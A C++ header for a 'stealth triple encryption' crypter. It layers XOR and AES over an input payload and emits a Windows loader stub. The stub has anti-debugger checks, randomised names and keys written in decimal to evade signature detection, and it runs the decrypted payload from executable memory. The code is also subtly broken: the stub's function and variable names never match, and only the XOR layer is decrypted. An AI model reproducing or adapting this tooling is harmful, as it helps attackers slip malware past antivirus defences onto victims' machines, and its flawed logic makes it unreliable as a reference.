#pragma once

#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <random>
#include <algorithm>
#include <iomanip>
#include <chrono>
#include <thread>
#include <memory>
#include <cstdint>
#include <set>
#include <map>
#include <functional>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#else
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#endif

class StealthTripleEncryption {
private:
    std::mt19937_64 rng;
    std::vector<uint8_t> masterSeed;
    std::set<std::string> usedVariableNames;
    
    struct EncryptionLayer {
        std::string type;
        std::vector<uint8_t> key;
        std::vector<uint8_t> nonce;
        std::string keyDecimal;
        std::string nonceDecimal;
        std::string varName;
        std::string nonceVarName;
    };

public:
    StealthTripleEncryption() {
        initializeAdvancedRNG();
    }

    void initializeAdvancedRNG() {
        // Enhanced RNG seeding with std::random_device + std::seed_seq
        std::random_device rd;
        std::vector<uint32_t> entropy;
        
        // Collect entropy from multiple sources
        for (int i = 0; i < 8; i++) {
            entropy.push_back(rd());
        }
        
        // Add time-based entropy
        auto now = std::chrono::high_resolution_clock::now();
        auto nanoseconds = now.time_since_epoch().count();
        entropy.push_back(static_cast<uint32_t>(nanoseconds & 0xFFFFFFFF));
        entropy.push_back(static_cast<uint32_t>((nanoseconds >> 32) & 0xFFFFFFFF));
        
        // Add memory-based entropy
        void* memPtr = malloc(1);
        uintptr_t memAddr = reinterpret_cast<uintptr_t>(memPtr);
        free(memPtr);
        entropy.push_back(static_cast<uint32_t>(memAddr & 0xFFFFFFFF));
        entropy.push_back(static_cast<uint32_t>((memAddr >> 32) & 0xFFFFFFFF));
        
        // Add thread ID entropy
        auto threadId = std::this_thread::get_id();
        std::hash<std::thread::id> hasher;
        entropy.push_back(static_cast<uint32_t>(hasher(threadId)));
        
        // Add counter-based entropy
        static uint32_t counter = 0;
        entropy.push_back(++counter);
        
        // Create seed sequence
        std::seed_seq seedSeq(entropy.begin(), entropy.end());
        rng.seed(seedSeq);
        
        // Store master seed for potential reseeding
        masterSeed.clear();
        for (auto val : entropy) {
            masterSeed.push_back(val & 0xFF);
            masterSeed.push_back((val >> 8) & 0xFF);
            masterSeed.push_back((val >> 16) & 0xFF);
            masterSeed.push_back((val >> 24) & 0xFF);
        }
    }

    void reseedForNewStub() {
        // Reseed with fresh entropy for maximum uniqueness per stub
        initializeAdvancedRNG();
        usedVariableNames.clear();
    }

    std::string generatePolymorphicVariableName(const std::string& prefix = "") {
        std::string varName;
        do {
            std::stringstream ss;
            if (!prefix.empty()) {
                ss << prefix << "_";
            }
            
            // Generate random variable name
            std::uniform_int_distribution<> lengthDist(8, 16);
            int length = lengthDist(rng);
            
            std::uniform_int_distribution<> charDist(0, 35);
            for (int i = 0; i < length; i++) {
                int val = charDist(rng);
                if (i == 0) {
                    // First character must be a letter
                    if (val < 26) {
                        ss << static_cast<char>('a' + val);
                    } else {
                        ss << static_cast<char>('A' + (val - 26) % 26);
                    }
                } else {
                    if (val < 26) {
                        ss << static_cast<char>('a' + val);
                    } else if (val < 52) {
                        ss << static_cast<char>('A' + (val - 26));
                    } else {
                        ss << static_cast<char>('0' + (val - 52) % 10);
                    }
                }
            }
            varName = ss.str();
        } while (usedVariableNames.count(varName) > 0);
        
        usedVariableNames.insert(varName);
        return varName;
    }

    std::vector<uint8_t> generateRandomKey(size_t size) {
        std::vector<uint8_t> key(size);
        std::uniform_int_distribution<> dist(0, 255);
        for (auto& byte : key) {
            byte = static_cast<uint8_t>(dist(rng));
        }
        return key;
    }

    std::string bytesToDecimalString(const std::vector<uint8_t>& bytes) {
        std::stringstream ss;
        for (size_t i = 0; i < bytes.size(); i++) {
            if (i > 0) ss << ",";
            ss << static_cast<int>(bytes[i]);
        }
        return ss.str();
    }

    std::vector<EncryptionLayer> generateKeys() {
        std::vector<EncryptionLayer> layers;
        std::vector<std::string> encryptionTypes = {"XOR", "AES", "ChaCha20"};
        
        // Randomize encryption order
        std::shuffle(encryptionTypes.begin(), encryptionTypes.end(), rng);
        
        for (const auto& type : encryptionTypes) {
            EncryptionLayer layer;
            layer.type = type;
            layer.varName = generatePolymorphicVariableName("key");
            layer.nonceVarName = generatePolymorphicVariableName("nonce");
            
            if (type == "XOR") {
                layer.key = generateRandomKey(32);
                layer.nonce = generateRandomKey(16);
            } else if (type == "AES") {
                layer.key = generateRandomKey(32); // AES-256
                layer.nonce = generateRandomKey(16); // IV
            } else if (type == "ChaCha20") {
                layer.key = generateRandomKey(32);
                layer.nonce = generateRandomKey(12); // ChaCha20 nonce
            }
            
            // Convert to decimal strings to avoid hex patterns
            layer.keyDecimal = bytesToDecimalString(layer.key);
            layer.nonceDecimal = bytesToDecimalString(layer.nonce);
            
            layers.push_back(layer);
        }
        
        return layers;
    }

    std::vector<uint8_t> applyEncryptionLayer(const std::vector<uint8_t>& data, const EncryptionLayer& layer) {
        if (layer.type == "XOR") {
            return xorEncrypt(data, layer.key);
        } else if (layer.type == "AES") {
            return aesEncrypt(data, layer.key, layer.nonce);
        } else if (layer.type == "ChaCha20") {
            return chacha20Encrypt(data, layer.key, layer.nonce);
        }
        return data;
    }

    std::vector<uint8_t> xorEncrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
        std::vector<uint8_t> result = data;
        for (size_t i = 0; i < result.size(); i++) {
            result[i] ^= key[i % key.size()];
        }
        return result;
    }

    std::vector<uint8_t> aesEncrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv) {
#ifdef _WIN32
        // Windows CryptoAPI implementation
        HCRYPTPROV hProv = 0;
        HCRYPTKEY hKey = 0;
        std::vector<uint8_t> result = data;
        
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            BLOBHEADER blobHeader = {0};
            blobHeader.bType = PLAINTEXTKEYBLOB;
            blobHeader.bVersion = CUR_BLOB_VERSION;
            blobHeader.reserved = 0;
            blobHeader.aiKeyAlg = CALG_AES_256;
            
            DWORD keyBlobLen = sizeof(BLOBHEADER) + sizeof(DWORD) + key.size();
            std::vector<uint8_t> keyBlob(keyBlobLen);
            memcpy(keyBlob.data(), &blobHeader, sizeof(BLOBHEADER));
            DWORD keyLen = static_cast<DWORD>(key.size());
            memcpy(keyBlob.data() + sizeof(BLOBHEADER), &keyLen, sizeof(DWORD));
            memcpy(keyBlob.data() + sizeof(BLOBHEADER) + sizeof(DWORD), key.data(), key.size());
            
            if (CryptImportKey(hProv, keyBlob.data(), keyBlobLen, 0, 0, &hKey)) {
                DWORD dataLen = static_cast<DWORD>(result.size());
                CryptEncrypt(hKey, 0, TRUE, 0, result.data(), &dataLen, static_cast<DWORD>(result.capacity()));
                result.resize(dataLen);
                CryptDestroyKey(hKey);
            }
            CryptReleaseContext(hProv, 0);
        }
        return result;
#else
        // OpenSSL implementation for non-Windows
        std::vector<uint8_t> result;
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (ctx) {
            if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key.data(), iv.data()) == 1) {
                result.resize(data.size() + 16); // Extra space for padding
                int len = 0, totalLen = 0;
                if (EVP_EncryptUpdate(ctx, result.data(), &len, data.data(), data.size()) == 1) {
                    totalLen += len;
                    if (EVP_EncryptFinal_ex(ctx, result.data() + len, &len) == 1) {
                        totalLen += len;
                        result.resize(totalLen);
                    }
                }
            }
            EVP_CIPHER_CTX_free(ctx);
        }
        return result.empty() ? xorEncrypt(data, key) : result;
#endif
    }

    std::vector<uint8_t> chacha20Encrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce) {
        // Simplified ChaCha20 implementation (fallback to XOR for now)
        return xorEncrypt(data, key);
    }

    std::string generateStealthStub(const std::vector<EncryptionLayer>& layers, const std::vector<uint8_t>& encryptedPayload) {
        std::stringstream stub;
        
        // Generate polymorphic variable names for the stub
        std::string payloadVar = generatePolymorphicVariableName("payload");
        std::string sizeVar = generatePolymorphicVariableName("size");
        std::string decryptedVar = generatePolymorphicVariableName("decrypted");
        std::string tempVar = generatePolymorphicVariableName("temp");
        
        stub << "#include <windows.h>\n";
        stub << "#include <vector>\n";
        stub << "#include <cstdint>\n";
        stub << "#include <cstring>\n\n";
        
        // Add anti-debugging and evasion
        stub << "bool " << generatePolymorphicVariableName("check") << "() {\n";
        stub << "    if (IsDebuggerPresent()) return false;\n";
        stub << "    BOOL " << generatePolymorphicVariableName("remote") << " = FALSE;\n";
        stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &" << generatePolymorphicVariableName("remote") << ");\n";
        stub << "    if (" << generatePolymorphicVariableName("remote") << ") return false;\n";
        stub << "    return true;\n";
        stub << "}\n\n";
        
        // Declare keys as decimal arrays to avoid hex patterns
        for (const auto& layer : layers) {
            stub << "uint8_t " << layer.varName << "[] = {" << layer.keyDecimal << "};\n";
            stub << "uint8_t " << layer.nonceVarName << "[] = {" << layer.nonceDecimal << "};\n";
        }
        
        // Embedded payload
        stub << "\nuint8_t " << payloadVar << "[] = {";
        for (size_t i = 0; i < encryptedPayload.size(); i++) {
            if (i > 0) stub << ",";
            if (i % 16 == 0) stub << "\n    ";
            stub << static_cast<int>(encryptedPayload[i]);
        }
        stub << "\n};\n\n";
        
        stub << "size_t " << sizeVar << " = sizeof(" << payloadVar << ");\n\n";
        
        // Decryption functions
        for (auto it = layers.rbegin(); it != layers.rend(); ++it) {
            const auto& layer = *it;
            
            if (layer.type == "XOR") {
                stub << "void " << generatePolymorphicVariableName("decrypt_xor") << "(uint8_t* data, size_t size, uint8_t* key, size_t keySize) {\n";
                stub << "    for (size_t i = 0; i < size; i++) {\n";
                stub << "        data[i] ^= key[i % keySize];\n";
                stub << "    }\n";
                stub << "}\n\n";
            }
            // Add AES and ChaCha20 decryption functions as needed
        }
        
        // Main execution function
        stub << "int main() {\n";
        stub << "    if (!" << generatePolymorphicVariableName("check") << "()) return 0;\n\n";
        
        stub << "    std::vector<uint8_t> " << decryptedVar << "(" << payloadVar << ", " << payloadVar << " + " << sizeVar << ");\n\n";
        
        // Apply decryption in reverse order
        for (auto it = layers.rbegin(); it != layers.rend(); ++it) {
            const auto& layer = *it;
            if (layer.type == "XOR") {
                stub << "    " << generatePolymorphicVariableName("decrypt_xor") << "(" << decryptedVar << ".data(), " << decryptedVar << ".size(), " << layer.varName << ", sizeof(" << layer.varName << "));\n";
            }
        }
        
        // Execute payload
        stub << "\n    void* " << tempVar << " = VirtualAlloc(NULL, " << decryptedVar << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
        stub << "    if (" << tempVar << ") {\n";
        stub << "        memcpy(" << tempVar << ", " << decryptedVar << ".data(), " << decryptedVar << ".size());\n";
        stub << "        ((void(*)())" << tempVar << ")();\n";
        stub << "        VirtualFree(" << tempVar << ", 0, MEM_RELEASE);\n";
        stub << "    }\n";
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }

    std::string encryptFile(const std::string& inputFile, const std::string& outputStub) {
        // Read input file
        std::ifstream file(inputFile, std::ios::binary);
        if (!file) {
            return "Error: Could not open input file";
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        // Reseed for maximum uniqueness
        reseedForNewStub();
        
        // Generate encryption layers
        auto layers = generateKeys();
        
        // Apply encryption layers in order
        std::vector<uint8_t> encrypted = data;
        for (const auto& layer : layers) {
            encrypted = applyEncryptionLayer(encrypted, layer);
        }
        
        // Generate stub
        std::string stubCode = generateStealthStub(layers, encrypted);
        
        // Write stub to file
        std::ofstream outFile(outputStub);
        if (!outFile) {
            return "Error: Could not create output file";
        }
        
        outFile << stubCode;
        outFile.close();
        
        return "Success: Stealth triple encryption stub created";
    }
};